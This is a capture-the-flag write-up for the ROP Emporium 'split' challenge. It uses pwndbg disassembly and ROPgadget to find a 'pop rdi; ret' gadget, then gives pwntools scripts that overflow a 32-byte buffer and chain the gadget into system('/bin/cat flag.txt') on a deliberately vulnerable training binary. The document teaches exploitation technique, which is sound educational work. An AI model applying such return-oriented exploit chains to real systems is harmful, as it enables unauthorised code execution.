# Challenge 2: **split**

https://ropemporium.com/challenge/split.html

First, let’s disassemble the main function using gdb. I will be using pwndbg, a gdb plugin aimed to assist exploit creation and reverse engineering.

```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0000000000400697 <+0>:	push   rbp
   0x0000000000400698 <+1>:	mov    rbp,rsp
   0x000000000040069b <+4>:	mov    rax,QWORD PTR [rip+0x2009d6]        # 0x601078 <stdout@@GLIBC_2.2.5>
   0x00000000004006a2 <+11>:	mov    ecx,0x0
   0x00000000004006a7 <+16>:	mov    edx,0x2
   0x00000000004006ac <+21>:	mov    esi,0x0
   0x00000000004006b1 <+26>:	mov    rdi,rax
   0x00000000004006b4 <+29>:	call   0x4005a0 <setvbuf@plt>
   0x00000000004006b9 <+34>:	mov    edi,0x4007e8
   0x00000000004006be <+39>:	call   0x400550 <puts@plt>
   0x00000000004006c3 <+44>:	mov    edi,0x4007fe
   0x00000000004006c8 <+49>:	call   0x400550 <puts@plt>
   0x00000000004006cd <+54>:	mov    eax,0x0
   0x00000000004006d2 <+59>:	call   0x4006e8 <pwnme>
   0x00000000004006d7 <+64>:	mov    edi,0x400806
   0x00000000004006dc <+69>:	call   0x400550 <puts@plt>
   0x00000000004006e1 <+74>:	mov    eax,0x0
   0x00000000004006e6 <+79>:	pop    rbp
   0x00000000004006e7 <+80>:	ret    
End of assembler dump.
pwndbg>
```

Like the last challenge, we see a pwnme function. Let’s disassemble that.

```
pwndbg> disassemble pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:	push   rbp
   0x00000000004006e9 <+1>:	mov    rbp,rsp
   0x00000000004006ec <+4>:	sub    rsp,0x20
   0x00000000004006f0 <+8>:	lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:	mov    edx,0x20
   0x00000000004006f9 <+17>:	mov    esi,0x0
   0x00000000004006fe <+22>:	mov    rdi,rax
   0x0000000000400701 <+25>:	call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:	mov    edi,0x400810
   0x000000000040070b <+35>:	call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:	mov    edi,0x40083c
   0x0000000000400715 <+45>:	mov    eax,0x0
   0x000000000040071a <+50>:	call   0x400570 <printf@plt>
   0x000000000040071f <+55>:	lea    rax,[rbp-0x20]
   0x0000000000400723 <+59>:	mov    edx,0x60
   0x0000000000400728 <+64>:	mov    rsi,rax
   0x000000000040072b <+67>:	mov    edi,0x0
   0x0000000000400730 <+72>:	call   0x400590 <read@plt>
   0x0000000000400735 <+77>:	mov    edi,0x40083f
   0x000000000040073a <+82>:	call   0x400550 <puts@plt>
   0x000000000040073f <+87>:	nop
   0x0000000000400740 <+88>:	leave  
   0x0000000000400741 <+89>:	ret    
End of assembler dump.
pwndbg> 

```

Like the last challenge, there is a buffer created with a size of 32 (0x20 in decimal) bytes. However, unlike the prior challenge, a larger value of 0x60 is moved into the edx register, making the call to read end up reading 96 (0x60 in decimal) bytes, greater than the 56 bytes read in the last challenge. This means we have more room to make a payload, which you’ll see is necessary in a moment. Let’s look at a list of all functions within the program.

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400742  usefulFunction
0x0000000000400760  __libc_csu_init
0x00000000004007d0  __libc_csu_fini
0x00000000004007d4  _fini
pwndbg> 
```

Notice something? There is no ret2win function unlike last challenge. This means that to get the flag, we will have to do more than simply change the return address after a buffer. There is however a function not present in last challenge, `usefulFunction`. Let’s look at that.

```
pwndbg> disassemble usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:	push   rbp
   0x0000000000400743 <+1>:	mov    rbp,rsp
   0x0000000000400746 <+4>:	mov    edi,0x40084a
   0x000000000040074b <+9>:	call   0x400560 <system@plt>
   0x0000000000400750 <+14>:	nop
   0x0000000000400751 <+15>:	pop    rbp
   0x0000000000400752 <+16>:	ret    
End of assembler dump.
pwndbg> 
```

Let’s analyze the function:

- First, the register `rbp` is pushed to the stack, and the address from `rsp` is moved onto `rbp`. The register `rbp` is special - it holds the base address of the *stack frame* for the function usefulFunction, a section of the stack allocated for the function to store variables, parameters, and return addresses. In other words, the stack frame is a place in the stack for the function and the function only, and the base address denotes the start of it. The address stored in `rsp` is moved to `rbp` because `rsp` holds the current top of the stack, and transferring this address to `rbp` establishes `rbp` as the starting point of the function.
- Next, the syscall system is called. Right before it’s called, the value from the address `0x40084a` is moved onto the `edi` register, setting up the value from `0x40084a` to be the first (and only parameter) for the system function.
- After system is called, the register `rbp` is popped from the stack, restoring its previous value, and the function returns through the instruction `ret`. The `nop` instruction, as it looks, does nothing. It’s likely present for alignment to maintain a consistent instruction length.
- System is called by calling the address `0x400560`, meaning the `system` function is linked to that address. This is due to the Procedure Linkage Table (PLT), which links shared library functions to addresses so they can be called within the program.

So, let’s look at the value present in the address `0x40084a`.

```
pwndbg> x/s 0x40084a
0x40084a:	"/bin/ls"
pwndbg> 
```

So, the address `0x40084a` stores the value "/bin/ls", meaning usefulFunction lists the files in the program’s directory. Let’s confirm this through a script similar to how we solved last challenge.

```python
from pwn import *

p = process("./split", stdout=PIPE, stderr=PIPE)

# Address of usefulFunction
useful_address = 0x400742

# Payload
payload = b"A" * 32             # Fill the buffer
payload += b"B" * 8             # Fill the base pointer
payload += p64(useful_address)  # Change the return address
                                # to call usefulFunction
# Send the payloads
p.sendline(payload)

# Get the result
p.interactive()
```

And, as expected, we simply get a list of files in the current directory.

```
(myenv) root@ubuntu:/home/c-bass/pwn/ropemporium/split# python3 list.py
[+] Starting local process './split': pid 152921
[*] Switching to interactive mode
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
**flag.txt**
list.py
solve.py
split
split.zip
[*] Got EOF while reading in interactive
$  
```

Unlike the name of the function, that’s *not* useful. We want to see the flag, not see that the flag is in the current directory. It would, however, be useful if the flag was referenced within the program in some way.

```
pwndbg> search "flag.txt"
Searching for value: 'flag.txt'
split           0x601069 'flag.txt'
pwndbg> 
```

So, the string flag.txt is present within the program! Let’s look at the surrounding area of the stack near where we found flag.txt to understand further.

```
pwndbg> x/20x 0x601069-0x10
0x601059:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x2f
0x601061 <usefulString+1>:	0x62	0x69	0x6e	0x2f	0x63	0x61	0x74	0x20
0x601069 <usefulString+9>:	0x66	0x6c	0x61	0x67
pwndbg> 
```

So, there’s a variable called usefulString that has the string flag.txt within it. Let’s look at the value of usefulString directly. We can tell the variable usefulString is at an address of `0x601060` as the address `0x601061` is displayed as `usefulString+1`. Subtracting 1, we get `0x601060`.

```
pwndbg> x/s 0x601060
0x601060 <usefulString>:	"/bin/cat flag.txt"
pwndbg> 
```

This is more useful! If we could find a way to input this string into the system function, we would get the flag. Here is what we have:

- A string "/bin/cat flag.txt" is at `0x601060`
- The system function is at `0x400560`

We need a way to call system with the string "/bin/cat flag.txt", linking the two together. We know that system takes in one argument, the command to execute, through the register `rdi`. Thus, if we could somehow change `rdi` to point to the string "/bin/cat flag.txt", then return to the system function, we would get the flag! This means we would have to change `rdi` to `0x601060` then jump to `0x400560`. To understand how to do this, we first have to review the stack.

The stack is a section of memory used for managing function calls, local variables, and control flow in a program. The stack can be thought of as similar to a stack of objects. The top of the stack is the only object you can see, remove, or add another object on top of. From this, we can see that the top of the stack must have the most recently pushed “object”. The stack grows downwards, with every added “object” pushing the existing ones downwards.

To control the top of the stack, we use the `pop` and `push` instructions. The `pop` instruction removes the item at the top of the stack while the push instruction pushes an item to the top of the stack, pushing everything below downwards. However, when we combine the `pop` or `push` instructions with a register, such as `rdi`, we can control the top of the stack *in conjunction* with the register! The `push rdi` instruction pushes the value in `rdi` onto the top of the stack while the `pop rdi` instruction removes the top of the stack and puts it in `rdi`. We can control the top of the stack through memory addresses we overflow the buffer with. This means that if we can find a `pop rdi` instruction within the program, we can control the value of `rdi` and thus control the value being inputted into the system function.

```
$ ROPgadget --binary ./split | grep 'pop rdi'
0x00000000004007c3 : pop rdi ; ret
$
```

From this, we see that at the memory address `0x4007c3`, there are the instructions `pop rdi ; ret`. These instructions do the following:

- Remove the top of the stack and put it in the register `rdi`
- Jump to the address at the top of the stack (this is what the instruction `ret` does)

However, as mentioned earlier, we can actually *control* the top of the stack through the buffer overflow. Thus, using the instructions (known in this context as a *gadget*) `pop rdi ; ret` , it’s possible to call `system("/bin/cat flag.txt")`, giving us the flag.

To exploit this, we first place the address for the gadget, `0x4007c3`, at the top of the stack by placing it right after our buffer overflow. Since this replaces the return address following the buffer, the function returns and runs the instructions  `pop rdi ; ret`. Once these instructions start being ran, they are removed from the top of the stack. Following this, we place the address for the string “/bin/cat flag.txt”, `0x601060`, on top of the stack, resulting in this being removed from the top of the stack and being stored in the register `rdi`. Finally, we put the address pointing to the system call on top of the stack, resulting in it being jumped to and subsequently ran by the `ret` instruction.

We can make the payload by chaining these addresses together after overloading the buffer. The address for the gadget `pop rdi ; ret` overwrites the return address following the buffer, jumping to the instructions and then subsequently resulting in `"/bin/cat flag.txt"` being pointed to in `rdi` and the system function being called with this as a parameter.

It’s helpful to visualize the stack as the instructions are executed:

- This is how the stack looks once we first overflow the buffer.
    
    
    | 1 | 0x4007c3 |
    | --- | --- |
    | 2 | 0x601060 |
    | 3 | 0x400560 |
- Then, the program jumps to `0x4007c3` because this address was placed at the return address of the buffer, causing the program to return to it and execute its instructions. Once the program jumps to `0x4007c3`, the address `0x4007c3` is no longer at the top of the stack.
    
    
    | 1 | 0x601060 |
    | --- | --- |
    | 2 | 0x400560 |
    | 3 |  |
- As `0x4007c3` contained the instructions `pop rdi ; ret`, the `pop rdi` instruction removes the top of the stack and puts it in the register `rdi`. Since the top of the stack points to the string `"/bin/cat flag.txt"` , the register `rdi` now contains the pointer `0x601060` to this string. The stack now looks like this:
    
    
    | 1 | 0x400560 |
    | --- | --- |
    | 2 |  |
    | 3 |  |
- Now, the instruction `ret` is executed, resulting in the program’s execution jumping to the address at the top of the stack. In other words, `ret` runs the instructions pointed to at the top of the stack. Since `0x400560` points to a call to the function `system` and the register `rdi` holds the string `"/bin/cat flag.txt"`, the program calls `system("/bin/cat flag.txt")`, printing the flag.
    - To clarify, the register `rdi` holds the first argument to a function call or syscall. This is why we needed to place `"/bin/cat flag.txt"`  within `rdi` and not a different register.

Using python’s pwntools, we can make a basic script to accomplish all of this.

```python
from pwn import *

p = process("./split", stdout=PIPE, stderr=PIPE)
 
## RELEVANT ADDRESSES

gadget_address = 0x4007c3   # Address of pop rdi; ret
string_address = 0x601060   # Address of "/bin/cat flag.txt"
system_address = 0x400560   # Address of system syscall

## PAYLOAD

payload = b"A" * 40
payload += p64(gadget_address)
payload += p64(string_address)
payload += p64(system_address)

# Send the payloads
p.sendline(payload)

# Get the result
p.interactive()
```

And we get the flag!

```
(myenv) root@ubuntu:/home/c-bass/pwn/ropemporium/split# python3 solve.py
[+] Starting local process './split': pid 152871
[*] Switching to interactive mode
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```